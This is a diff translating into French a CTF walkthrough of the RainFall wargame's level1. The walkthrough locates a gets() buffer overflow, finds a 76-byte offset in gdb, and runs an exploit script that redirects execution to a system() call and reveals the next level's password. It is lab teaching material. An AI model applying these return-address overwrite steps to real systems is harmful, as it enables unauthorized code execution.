@@ -1,4 +1,4 @@
-We use objdump to have a overview of the binary level1:
+Nous utilisons objdump pour avoir un aperçu du binaire level1 :
 
 ```
 level1@RainFall:~$ objdump ./level1 -d
@@ -79,9 +79,7 @@ Disassembly of section .plt:
  804849f:	90                   	nop
  ```
 
-The run function is of interest, there is a gets call in main, gets is vulnerable to buffer overflow attack.
-So we will try to modify the return address to access run function that has a system function call.
-First we check if level1 is vulnerable to overflowattack:
+La fonction **run** est intéressante, il y a un appel à **gets** dans main, qui est vulnérable à une attaque buffer overflow. Nous allons donc essayer de modifier l'adresse de retour pour accéder à la fonction **run** qui appelle **system**. Tout d'abord, nous vérifions si level1 est vulnérable à une attaque par buffer overflow :
 
 ```
 level1@RainFall:~$ checksec --file ./level1 
@@ -89,15 +87,13 @@ RELRO           STACK CANARY      NX            PIE             RPATH      RUNPA
 No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   ./level1
 ```
 
-No canary found, so we can exploit with bufferoverflow
-First we will fint out the offset of the buffer, then craft a payload.
-We run pattern.py that basically outputs a string of pattern:
+Aucun canary trouvé, donc nous pouvons exploiter la vulnérabilité avec un buffer oveflow. D'abord, nous allons trouver l'offset du buffer, puis créer payload.
 
 ```
 level1@RainFall:~$ python /tmp/pattern.py
 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
 ```
-Then we will try our string as argument, we want to erase the eip in the main with the address of run function
+Ensuite, nous tentons de modifier l'EIP dans **main** avec l'adresse de la fonction **run**.
 
 ```
 level1@RainFall:~$ gdb -q ./level1
@@ -152,18 +148,15 @@ Continuing.
 Program received signal SIGSEGV, Segmentation fault.
 0x63413563 in ?? ()
 ```
-We have segfault at 0x63413563 and the info frame command gives us:
-Stack level 0, frame at 0xbffff740:
-eip = 0x8048496 in main; saved eip 0x63413563
+Nous avons un segfault à l'adresse ```0x63413563``` et la commande info frame nous donne: **saved eip 0x63413563**
+Ainsi, nous savons que eip a été écrasé par cette valeur : ```0x63413563``` Nous allons vérifier la position de cette valeur dans notre pattern en utilisant notre script:
 
-So we know that eip has been overwritten by this value: 0x63413563
-we will check the position of this in our string pattern using our script:
 ```
 level1@RainFall:~$ python /tmp/pattern.py > /tmp/pattern
 level1@RainFall:~$ python /tmp/pattern.py /tmp/pattern 0x63413563
 offset found at: 76
 ```
-We proceed to exploit with our exploit script:
+On exploit avec le script:
 ```
 level1@RainFall:~$ python /tmp/exploit.py 0x08048444 76
 crafting payload...
@@ -178,9 +171,7 @@ cat /home/user/level2/.pass
 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
 ```
 
-We saw that the limit is 76 bytes, we can also proceed manually by identifying the eip address
-and substract the address of the start of the buffer from it. We know from the disassembled code that
-0x50 are reserved so the buffer is 0x50 - 0x10 long ie 64 bytes.
+Nous avons vu que la limite est de 76 octets, nous pouvons également procéder manuellement en identifiant l'adresse de **eip** et en soustrayant l'adresse de début du buffer. Nous savons, d'après le code désassemblé, que 0x50 octets sont réservés, donc le buffer fait 0x50 - 0x10, soit 64 octets.
 
 ```
 level1@RainFall:~$ gdb -q ./level1 
